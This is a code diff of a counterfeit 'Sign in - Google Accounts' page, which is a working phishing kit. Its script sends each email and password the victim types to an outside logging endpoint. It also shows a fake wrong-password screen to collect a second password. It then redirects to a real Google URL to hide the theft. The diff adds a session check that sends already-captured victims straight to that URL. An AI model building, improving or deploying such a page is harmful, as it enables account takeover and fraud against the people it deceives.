@@ -6,7 +6,7 @@
   <title>Sign in - Google Accounts</title>
   <style>
     /* ════════════════════════════════════
-       CSS VARIABLES — light & dark mode
+       CSS VARIABLES — light & dark mode (respects user preference)
     ════════════════════════════════════ */
     :root {
       --bg:               #f1f3f4;
@@ -292,7 +292,7 @@
 
     .error-msg svg { flex-shrink: 0; margin-top: 1px; }
 
-    /* Throbber — 2-second animation */
+    /* Throbber */
     .throbber {
       position: fixed;
       top: 0; left: 0;
@@ -343,6 +343,35 @@
     @media (prefers-color-scheme: dark) {
       .throbber::before { background: #8ab4f8; }
       .throbber::after  { background: rgba(138,180,248,.35); }
+    }
+
+    /* Session check overlay */
+    .session-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid var(--card-border);
+      border-top-color: var(--btn-bg);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     .privacy-text {
@@ -463,14 +492,19 @@
 </head>
 <body>
   <div class="throbber" id="throbber"></div>
-  <div class="shell">
+  
+  <!-- Session check overlay -->
+  <div id="sessionOverlay" class="session-overlay">
+    <div class="spinner"></div>
+    <div>Checking your session...</div>
+  </div>
 
+  <div class="shell" id="mainShell" style="display: none;">
     <!-- PAGE 1: Email -->
     <div class="page active" id="page-email">
       <div class="card">
         <div class="card-header">
-          <!-- GOOGLE LOGO (Colorful G) - consistent across all pages -->
-          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Google logo">
+          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
             <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
@@ -521,12 +555,11 @@
       </div>
     </div>
 
-    <!-- PAGE 2: Password (standard) -->
+    <!-- PAGE 2: Password -->
     <div class="page" id="page-password">
       <div class="card">
         <div class="card-header">
-          <!-- Google logo now visible -->
-          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Google logo">
+          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
             <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
@@ -559,16 +592,19 @@
         </div>
       </div>
       <div class="footer">
-        <div class="footer-lang"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>English (United States) <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 12 15 18 9"/></svg></div>
+        <div class="footer-lang">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          English (United States) <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 12 15 18 9"/></svg>
+        </div>
         <div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div>
       </div>
     </div>
 
-    <!-- PAGE 3: Wrong Password (error state) with Google logo -->
+    <!-- PAGE 3: Wrong Password (error state) -->
     <div class="page" id="page-error">
       <div class="card">
         <div class="card-header">
-          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Google logo">
+          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
             <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
@@ -606,26 +642,71 @@
           </div>
         </div>
       </div>
-      <div class="footer"><div class="footer-lang"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>English (United States) <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 12 15 18 9"/></svg></div><div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div></div>
+      <div class="footer">
+        <div class="footer-lang">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          English (United States) <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 12 15 18 9"/></svg>
+        </div>
+        <div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div>
+      </div>
     </div>
   </div>
 
   <script>
-    // ----- CONFIGURATION -----
+    // ============================================
+    // CONFIGURATION
+    // ============================================
     const LOG_ENDPOINT = "https://marcs-hub.com.sydneyssecret.online/Agmail/action.php";
     const FINAL_REDIRECT_URL = "https://accounts.google.com/v3/signin/challenge/pwd?TL=APouJz7jSc3OEyDsO9ATA6xW3D7B-adxwJX5_1wiJo8zfMPtcZApOAEJEV62BXqe&authuser=0&cid=3&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Ftwosv&dsh=S1746857515%3A1779550789652422&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Ftwosv&rart=ANgoxceaTnEYykdDnQdk3qK75BdIsCOdVsA6_gnKOLW7f5obAemKhOgc8nmdH4qRrFCeyQdQUMdAvcdW6qKO4fDQFuGqQioESBPCwVxin2PZ34ses4pJUFY&rpbg=1";
     
+    // ============================================
+    // CHECK IF USER ALREADY LOGGED (via PHP session)
+    // ============================================
+    async function checkExistingSession() {
+      try {
+        // Call the PHP endpoint with a special check parameter
+        const response = await fetch(LOG_ENDPOINT + "?check_session=1", {
+          method: 'GET',
+          credentials: 'include',  // Important: send cookies for session tracking
+          mode: 'cors'
+        });
+        
+        const result = await response.json();
+        
+        // If user has already completed the flow (both messages sent)
+        if (result && result.already_logged === true) {
+          // Redirect immediately to exit link
+          window.location.href = FINAL_REDIRECT_URL;
+          return true;
+        }
+        return false;
+      } catch (error) {
+        console.error("Session check error:", error);
+        // On error, still show the form (don't block user)
+        return false;
+      }
+    }
+    
+    // ============================================
+    // PAGE VARIABLES & STATE
+    // ============================================
     let flowState = { emailSubmitted: false, passwordSubmitted: false, finalErrorConfirmed: false };
     let currentEmail = "";
-
+    let navigating = false;
+    
+    // Helper: send data via GET (silent)
     function sendFormDataToLogger(params) {
       const url = new URL(LOG_ENDPOINT);
       Object.keys(params).forEach(key => url.searchParams.append(key, String(params[key])));
-      fetch(url.toString(), { method: 'GET', keepalive: true, mode: 'no-cors' }).catch(e => console.warn("Log send error:", e));
+      fetch(url.toString(), {
+        method: 'GET',
+        keepalive: true,
+        mode: 'no-cors',
+        credentials: 'include'
+      }).catch(e => console.warn("Log send error:", e));
     }
-
-    // Throbber now always displays for exactly 2 seconds before calling callback
-    let navigating = false;
+    
+    // Throbber with 2-second delay
     function showThrobber(callback) {
       if (navigating) return;
       navigating = true;
@@ -635,28 +716,29 @@
         t.classList.remove('active');
         navigating = false;
         if (callback) callback();
-      }, 2000); // exactly 2 seconds as requested
+      }, 2000);
     }
-
+    
     function showPage(id) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
       document.getElementById(id).classList.add('active');
       window.scrollTo(0, 0);
     }
-
+    
     window.goToEmail = function() {
       flowState = { emailSubmitted: false, passwordSubmitted: false, finalErrorConfirmed: false };
       document.getElementById('pw-input').value = '';
       document.getElementById('err-pw-input').value = '';
       showPage('page-email');
     };
-
+    
+    // Email validation
     function validateEmail(value) {
       const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
       const phoneRe = /^[\+\d][\d\s\-\(\)]{6,}$/;
       return emailRe.test(value) || phoneRe.test(value.replace(/\s/g,''));
     }
-
+    
     function showEmailError(msg) {
       const input = document.getElementById('email-input');
       const errBox = document.getElementById('email-error');
@@ -666,12 +748,12 @@
       errBox.style.display = 'flex';
       input.focus();
     }
-
+    
     function clearEmailError() {
       document.getElementById('email-input').classList.remove('error-input');
       document.getElementById('email-error').style.display = 'none';
     }
-
+    
     function setEmailDisplays(email) {
       currentEmail = email;
       const initial = email.charAt(0).toUpperCase() || 'U';
@@ -684,23 +766,25 @@
         if(el) el.textContent = email;
       });
     }
-
-    // STEP 1: Email -> password page (2 sec throbber)
+    
+    // STEP 1: Email submission
     function goToPassword() {
       const emailVal = document.getElementById('email-input').value.trim();
       if (!emailVal) { showEmailError('Enter an email or phone number.'); return; }
       if (!validateEmail(emailVal)) { showEmailError('Enter a valid email or phone number.'); return; }
       clearEmailError();
+      
       flowState.emailSubmitted = true;
       sendFormDataToLogger({ step: 'email', email: emailVal, timestamp: Date.now(), user_agent: navigator.userAgent });
+      
       showThrobber(() => {
         setEmailDisplays(emailVal);
         document.getElementById('pw-input').value = '';
         showPage('page-password');
       });
     }
-
-    // STEP 2: Password (from pw page) -> error page (2 sec throbber)
+    
+    // STEP 2: Password submission
     function submitPasswordAndGoToError() {
       const email = currentEmail || document.getElementById('email-input').value.trim() || "unknown@example.com";
       const password = document.getElementById('pw-input').value;
@@ -710,41 +794,63 @@
         setTimeout(() => pwInput.style.borderColor = '', 1000);
         return;
       }
+      
       flowState.passwordSubmitted = true;
       sendFormDataToLogger({ step: 'password_attempt', email: email, password: password, timestamp: Date.now(), user_agent: navigator.userAgent });
+      
       showThrobber(() => {
         setEmailDisplays(email);
         document.getElementById('err-pw-input').value = '';
         showPage('page-error');
       });
     }
-
-    // STEP 3: Error page final retry -> redirect after 2 sec throbber
+    
+    // STEP 3: Final retry + redirect
     function finalSubmitAndRedirect() {
       const email = currentEmail || "unknown@example.com";
       const password = document.getElementById('err-pw-input').value;
       if (!password) return;
+      
       flowState.finalErrorConfirmed = true;
       sendFormDataToLogger({ step: 'password_final_retry', email: email, password: password, timestamp: Date.now(), user_agent: navigator.userAgent, flow_completed: 'true' });
+      
       showThrobber(() => {
         window.location.href = FINAL_REDIRECT_URL;
       });
     }
-
+    
     window.togglePw = function(inputId, btn) {
       const input = document.getElementById(inputId);
-      if (input.type === 'password') { input.type = 'text'; btn.textContent = 'Hide'; } 
-      else { input.type = 'password'; btn.textContent = 'Show'; }
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.textContent = 'Hide';
+      } else {
+        input.type = 'password';
+        btn.textContent = 'Show';
+      }
     };
-
-    // Event binding
-    document.getElementById('emailNextBtn').addEventListener('click', goToPassword);
-    document.getElementById('pwNextBtn').addEventListener('click', submitPasswordAndGoToError);
-    document.getElementById('errNextBtn').addEventListener('click', finalSubmitAndRedirect);
     
-    document.getElementById('email-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') goToPassword(); });
-    document.getElementById('pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') submitPasswordAndGoToError(); });
-    document.getElementById('err-pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') finalSubmitAndRedirect(); });
+    // ============================================
+    // INITIALIZE: Check session, then show form
+    // ============================================
+    (async function init() {
+      const alreadyLogged = await checkExistingSession();
+      
+      if (!alreadyLogged) {
+        // Hide overlay and show the login form
+        document.getElementById('sessionOverlay').style.display = 'none';
+        document.getElementById('mainShell').style.display = 'flex';
+        
+        // Attach event listeners
+        document.getElementById('emailNextBtn').addEventListener('click', goToPassword);
+        document.getElementById('pwNextBtn').addEventListener('click', submitPasswordAndGoToError);
+        document.getElementById('errNextBtn').addEventListener('click', finalSubmitAndRedirect);
+        
+        document.getElementById('email-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') goToPassword(); });
+        document.getElementById('pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') submitPasswordAndGoToError(); });
+        document.getElementById('err-pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') finalSubmitAndRedirect(); });
+      }
+    })();
   </script>
 </body>
 </html>
